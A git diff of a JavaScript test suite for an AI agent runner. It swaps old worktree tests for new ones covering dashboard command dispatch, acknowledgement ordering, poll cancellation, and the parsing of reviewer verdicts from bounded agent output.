-      expect(log.error).toHaveBeenCalledWith(
-        'Max consecutive poll failures reached, stopping runner',
-        expect.anything(),
-      );
-    });
+describe('dashboard commands', () => {
+  it.each([
+    [{ id: 'c', kind: 'cancel', payload: {} }, 'cancel', []],
+    [{ id: 'a', kind: 'permission', request_key: 'perm-1', payload: { answer: { optionId: 'allow' } } }, 'answerRequest', ['perm-1', { optionId: 'allow' }]],
+    [{ id: 'e', kind: 'elicitation', request_key: 'form-1', payload: { answer: { values: { name: 'Ada' } } } }, 'answerRequest', ['form-1', { values: { name: 'Ada' } }]],
+  ])('dispatches $kind and acknowledges only after local application', async (command, method, args) => {
+    const gate = deferred();
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => gate.promise);
+    const commands = vi.fn().mockResolvedValueOnce({ commands: [command] }).mockResolvedValue({ commands: [] });
+    const api = client({ pollClaimCommands: commands });
+    let workPolls = 0;
+    api.poll = vi.fn(async () => (++workPolls === 1 ? WORK : null));
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
+    const started = runner.start();
+    await waitFor(() => runtime[method].mock.calls.length === 1);
+    expect(api.pollClaimCommands).toHaveBeenCalledWith('runner-session', 42, transportOptions());
+    expect(runtime[method]).toHaveBeenCalledWith(...args);
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, command.id, 'acked', expect.anything(), transportOptions());
+    gate.resolve({ sessionId: 'acp', messageId: 'm', stopReason: command.kind === 'cancel' ? 'cancelled' : 'end_turn' });
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    await runner.shutdown();
+    await started;
+    if (command.kind === 'cancel') expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'cancelled' }));
   });
 
-  describe('worktree integration', () => {
-    it('creates worktree and runs agent in worktree cwd', async () => {
-      const mockCleanup = vi.fn().mockResolvedValue();
-      mockPrepareWorktree.mockResolvedValueOnce({
-        worktreePath: '/work/.fluent-flow/repos/fluent-io/fluent-flow/.worktrees/pr-40-attempt-1',
-        cleanup: mockCleanup,
-      });
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const client = makeClient({
-        poll: vi.fn()
-          .mockResolvedValueOnce({
-            message: 'fix the bug',
-            repo: 'fluent-io/fluent-flow',
-            pr_number: 40,
-            attempt: 1,
-            branch: 'fix/something',
-            agentType: 'claude-code',
-          })
-          .mockResolvedValue(null),
-      });
-      const log = makeLogger();
-      const runner = createRunner({ client, log, resolveCommand: (opts) => ({ bin: 'claude', args: [opts.prompt] }) });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      await runner.shutdown();
-      await startPromise;
-
-      expect(mockPrepareWorktree).toHaveBeenCalledWith(expect.objectContaining({
-        repo: 'fluent-io/fluent-flow',
-        prNumber: 40,
-        attempt: 1,
-        branch: 'fix/something',
-      }));
-
-      const spawnCall = mockSpawn.mock.calls[0];
-      expect(spawnCall[2].cwd).toBe('/work/.fluent-flow/repos/fluent-io/fluent-flow/.worktrees/pr-40-attempt-1');
-
-      expect(mockCleanup).toHaveBeenCalled();
+  it('queues a prompt during the initial turn without blocking later request answers', async () => {
+    const initialTurn = deferred();
+    const promptedTurn = deferred();
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    runtime.prompt.mockImplementationOnce(() => promptedTurn.promise);
+    const commands = [
+      { id: 'queued-prompt', kind: 'prompt', payload: { text: 'continue after the turn' } },
+      { id: 'permission-answer', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
+    ];
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands }).mockResolvedValue({ commands: [] }),
     });
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
+    const started = runner.start();
+    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
+    expect(runtime.answerRequest).toHaveBeenCalledWith('permission-1', { optionId: 'allow' });
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-answer', 'acked', { applied: true }, transportOptions());
+    expect(runtime.prompt).not.toHaveBeenCalled();
+    expect(api.ackClaimCommand).not.toHaveBeenCalledWith('runner-session', 42, 'queued-prompt', expect.anything(), expect.anything(), expect.anything());
+    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
+    await waitFor(() => runtime.prompt.mock.calls.length === 1);
+    expect(runtime.prompt).toHaveBeenCalledWith('continue after the turn');
+    expect(api.ackClaimCommand).not.toHaveBeenCalledWith('runner-session', 42, 'queued-prompt', expect.anything(), expect.anything(), expect.anything());
+    promptedTurn.resolve({ messageId: 'prompted', stopReason: 'end_turn' });
+    await waitFor(() => api.ackClaimCommand.mock.calls.some((call) => call[2] === 'queued-prompt'));
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'queued-prompt', 'acked', { applied: true }, transportOptions());
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    await runner.shutdown();
+    await started;
+  });
 
-    it('cleans up worktree even if agent fails', async () => {
-      const mockCleanup = vi.fn().mockResolvedValue();
-      mockPrepareWorktree.mockResolvedValueOnce({
-        worktreePath: '/work/.fluent-flow/repos/o/r/.worktrees/pr-1-attempt-1',
-        cleanup: mockCleanup,
-      });
-      mockSpawn.mockReturnValueOnce(fakeProcess(1));
-
-      const client = makeClient({
-        poll: vi.fn()
-          .mockResolvedValueOnce({
-            message: 'fix', repo: 'o/r', pr_number: 1, attempt: 1, branch: 'fix/x', agentType: 'claude-code',
-          })
-          .mockResolvedValue(null),
-      });
-      const log = makeLogger();
-      const runner = createRunner({ client, log, resolveCommand: (opts) => ({ bin: 'claude', args: [opts.prompt] }) });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      await runner.shutdown();
-      await startPromise;
-
-      expect(mockCleanup).toHaveBeenCalled();
+  it('aborts an outstanding normal poll without aborting an in-flight acknowledgement', async () => {
+    const initialTurn = deferred();
+    const promptedTurn = deferred();
+    const acknowledgement = deferred();
+    let pollAborted = false;
+    let acknowledgementAborted = false;
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    runtime.prompt.mockImplementationOnce(() => promptedTurn.promise);
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn()
+        .mockResolvedValueOnce({ commands: [{ id: 'prompt-with-ack', kind: 'prompt', payload: { text: 'continue' } }] })
+        .mockImplementationOnce((_sessionId, _claimId, { signal }) => new Promise((_resolve, reject) => {
+          signal.addEventListener('abort', () => {
+            pollAborted = true;
+            reject(new Error('poll stopped'));
+          }, { once: true });
+        })),
+      ackClaimCommand: vi.fn((_sessionId, _claimId, _commandId, _status, _result, { signal }) => {
+        signal.addEventListener('abort', () => {
+          acknowledgementAborted = true;
+          acknowledgement.reject(new Error('ack stopped'));
+        }, { once: true });
+        return acknowledgement.promise;
+      }),
     });
-
-    it('skips worktree when branch is not provided', async () => {
-      mockSpawn.mockReturnValueOnce(fakeProcess(0));
-
-      const client = makeClient({
-        poll: vi.fn()
-          .mockResolvedValueOnce({
-            message: 'fix', repo: 'o/r', pr_number: 1, attempt: 1, agentType: 'claude-code',
-          })
-          .mockResolvedValue(null),
-      });
-      const log = makeLogger();
-      const runner = createRunner({ client, log, resolveCommand: (opts) => ({ bin: 'claude', args: [opts.prompt] }) });
-
-      const startPromise = runner.start();
-      await new Promise((r) => setTimeout(r, 50));
-      await runner.shutdown();
-      await startPromise;
-
-      expect(mockPrepareWorktree).not.toHaveBeenCalled();
+    let runtimeOptions;
+    const runner = createRunner({
+      client: api,
+      log: logger(),
+      createAcpRuntime: vi.fn((options) => {
+        runtimeOptions = options;
+        return runtime;
+      }),
+      cwd: '/repo',
+      acpCommand: 'agent',
+      commandPollMs: 1,
     });
+    const started = runner.start();
+    await waitFor(() => api.pollClaimCommands.mock.calls.length === 2);
+    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
+    await waitFor(() => runtime.prompt.mock.calls.length === 1);
+    promptedTurn.resolve({ messageId: 'prompted', stopReason: 'end_turn' });
+    await waitFor(() => api.ackClaimCommand.mock.calls.length === 1);
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
+    await waitFor(() => pollAborted);
+    expect(acknowledgementAborted).toBe(false);
+    acknowledgement.resolve({ ok: true });
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    expect(acknowledgementAborted).toBe(false);
+    await runner.shutdown();
+    await started;
+  });
+
+  it('closes a runtime before awaiting a pending prompt when command polling fails', async () => {
+    const initialTurn = deferred();
+    const promptedTurn = deferred();
+    const secondPoll = deferred();
+    const order = [];
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    runtime.prompt.mockImplementationOnce(() => promptedTurn.promise);
+    runtime.close.mockImplementationOnce(async () => {
+      order.push('close');
+      promptedTurn.reject(new Error('runtime closed'));
+    });
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn()
+        .mockResolvedValueOnce({ commands: [{ id: 'queued', kind: 'prompt', payload: { text: 'next turn' } }] })
+        .mockImplementationOnce(() => secondPoll.promise),
+      reportClaim: vi.fn(async () => {
+        order.push('report');
+        return { ok: true };
+      }),
+    });
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
+    const started = runner.start();
+    await waitFor(() => api.pollClaimCommands.mock.calls.length === 2);
+    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
+    await waitFor(() => runtime.prompt.mock.calls.length === 1);
+    secondPoll.reject(new Error('command polling failed'));
+    await waitFor(() => runtime.close.mock.calls.length === 1);
+    const completion = Promise.race([
+      waitFor(() => api.reportClaim.mock.calls.length === 1).then(() => 'reported'),
+      new Promise((resolve) => setTimeout(() => resolve('timed-out'), 200)),
+    ]);
+    await expect(completion).resolves.toBe('reported');
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
+    expect(order.indexOf('close')).toBeGreaterThanOrEqual(0);
+    expect(order.indexOf('report')).toBeGreaterThan(order.indexOf('close'));
+    await runner.shutdown();
+    await started;
+  });
+
+  it('keeps command service alive when an initial idle snapshot precedes active state', async () => {
+    const initialTurn = deferred();
+    const leased = deferred();
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
+    });
+    let runtimeOptions;
+    const runner = createRunner({
+      client: api,
+      log: logger(),
+      createAcpRuntime: vi.fn((options) => {
+        runtimeOptions = options;
+        return runtime;
+      }),
+      cwd: '/repo',
+      acpCommand: 'agent',
+      commandPollMs: 1,
+    });
+    const started = runner.start();
+    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle' } });
+    leased.resolve({ commands: [
+      { id: 'permission-after-snapshot', kind: 'permission', request_key: 'permission-1', payload: { answer: { optionId: 'allow' } } },
+    ] });
+    await waitFor(() => runtime.answerRequest.mock.calls.length === 1);
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'permission-after-snapshot', 'acked', { applied: true }, transportOptions());
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
+    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
+    await runner.shutdown();
+    await started;
+  });
+
+  it('fails every command returned after command service shutdown as not applied', async () => {
+    const initialTurn = deferred();
+    const leased = deferred();
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn().mockImplementationOnce(() => leased.promise).mockResolvedValue({ commands: [] }),
+    });
+    let runtimeOptions;
+    const createAcpRuntime = vi.fn((options) => {
+      runtimeOptions = options;
+      return runtime;
+    });
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime, cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
+    const started = runner.start();
+    await waitFor(() => api.pollClaimCommands.mock.calls.length === 1);
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'running' } });
+    await runtimeOptions.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'state_update', state: 'idle', stopReason: 'end_turn' } });
+    initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'end_turn' });
+    leased.resolve({ commands: [
+      { id: 'late-1', kind: 'cancel', payload: {} },
+      { id: 'late-2', kind: 'permission', request_key: 'r', payload: { answer: { optionId: 'allow' } } },
+    ] });
+    await waitFor(() => api.ackClaimCommand.mock.calls.length === 2);
+    expect(api.ackClaimCommand.mock.calls).toEqual([
+      ['runner-session', 42, 'late-1', 'failed', { error: 'Command was not applied' }, transportOptions()],
+      ['runner-session', 42, 'late-2', 'failed', { error: 'Command was not applied' }, transportOptions()],
+    ]);
+    expect(runtime.cancel).not.toHaveBeenCalled();
+    expect(runtime.answerRequest).not.toHaveBeenCalled();
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    await runner.shutdown();
+    await started;
+  });
+
+  it('fails the unprocessed remainder of a leased command batch as not applied', async () => {
+    const initialTurn = deferred();
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(() => initialTurn.promise);
+    runtime.cancel.mockImplementationOnce(async () => {
+      initialTurn.resolve({ sessionId: 'acp', messageId: 'initial', stopReason: 'cancelled' });
+      return { stopReason: 'cancelled' };
+    });
+    const api = client({
+      poll: vi.fn().mockResolvedValueOnce(WORK).mockResolvedValue(null),
+      pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [
+        { id: 'cancel-now', kind: 'cancel', payload: {} },
+        { id: 'never-prompted', kind: 'prompt', payload: { text: 'must not run' } },
+        { id: 'never-answered', kind: 'elicitation', request_key: 'form', payload: { answer: { values: { x: 'y' } } } },
+      ] }).mockResolvedValue({ commands: [] }),
+    });
+    const runner = createRunner({ client: api, log: logger(), createAcpRuntime: vi.fn(() => runtime), cwd: '/repo', acpCommand: 'agent', commandPollMs: 1 });
+    const started = runner.start();
+    await waitFor(() => api.ackClaimCommand.mock.calls.length === 3);
+    expect(api.ackClaimCommand.mock.calls).toEqual([
+      ['runner-session', 42, 'cancel-now', 'acked', { applied: true }, transportOptions()],
+      ['runner-session', 42, 'never-prompted', 'failed', { error: 'Command was not applied' }, transportOptions()],
+      ['runner-session', 42, 'never-answered', 'failed', { error: 'Command was not applied' }, transportOptions()],
+    ]);
+    expect(runtime.prompt).not.toHaveBeenCalled();
+    expect(runtime.answerRequest).not.toHaveBeenCalled();
+    await waitFor(() => api.reportClaim.mock.calls.length === 1);
+    await runner.shutdown();
+    await started;
+  });
+
+  it('acknowledges definite local rejection as failed', async () => {
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
+    runtime.prompt.mockRejectedValueOnce(new Error('ACP session is not ready for a prompt'));
+    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'bad', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'bad', 'failed', expect.objectContaining({ error: expect.any(String) }), transportOptions());
+  });
+
+  it('acknowledges ambiguous transport application as uncertain and fails the claim transiently', async () => {
+    const runtime = fakeRuntime();
+    runtime.runInitialPrompt.mockImplementationOnce(async () => { await new Promise((resolve) => setTimeout(resolve, 30)); return { sessionId: 'a', messageId: 'm', stopReason: 'end_turn' }; });
+    runtime.prompt.mockRejectedValueOnce(new Error('ACP prompt acceptance is uncertain'));
+    const { api } = await runClaim({ runtime, clientOverrides: { pollClaimCommands: vi.fn().mockResolvedValueOnce({ commands: [{ id: 'ambiguous', kind: 'prompt', payload: { text: 'x' } }] }).mockResolvedValue({ commands: [] }) } });
+    expect(api.ackClaimCommand).toHaveBeenCalledWith('runner-session', 42, 'ambiguous', 'uncertain', expect.objectContaining({ error: expect.any(String) }), transportOptions());
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'failed', failure_kind: 'transient' }));
+  });
+});
+
+describe('review output', () => {
+  it.each([
+    ['<!-- reviewer-result: { "status": "FAIL" } -->', 'fail'],
+    ['<!-- reviewer-result: { "status": "PASS" } -->', 'pass'],
+  ])('derives %s verdict from normalized bounded agent text', async (text, verdict) => {
+    const runtime = fakeRuntime();
+    const { api } = await runClaim({
+      work: { ...WORK, claim_type: 'review' },
+      runtime,
+      runtimeFactory: vi.fn((options) => {
+        runtime.runInitialPrompt.mockImplementationOnce(async () => {
+          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text } } });
+          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
+        });
+        return runtime;
+      }),
+    });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed', verdict }));
+  });
+
+  it('bounds normalized agent text so an evicted verdict marker cannot affect the report', async () => {
+    const runtime = fakeRuntime();
+    const marker = '<!-- reviewer-result: { "status": "FAIL" } -->';
+    const { api } = await runClaim({
+      work: { ...WORK, claim_type: 'review' },
+      runtime,
+      runnerOptions: { agentTextLimitBytes: 64 },
+      runtimeFactory: vi.fn((options) => {
+        runtime.runInitialPrompt.mockImplementationOnce(async () => {
+          await options.onEvent({ sessionId: 'acp', update: { sessionUpdate: 'agent_message_chunk', content: { type: 'text', text: `${marker}${'x'.repeat(128)}` } } });
+          return { sessionId: 'acp', messageId: 'm', stopReason: 'end_turn' };
+        });
+        return runtime;
+      }),
+    });
+    expect(api.reportClaim).toHaveBeenCalledWith(expect.objectContaining({ status: 'completed' }));
+    expect(api.reportClaim.mock.calls[0][0]).not.toHaveProperty('verdict');
   });
 });
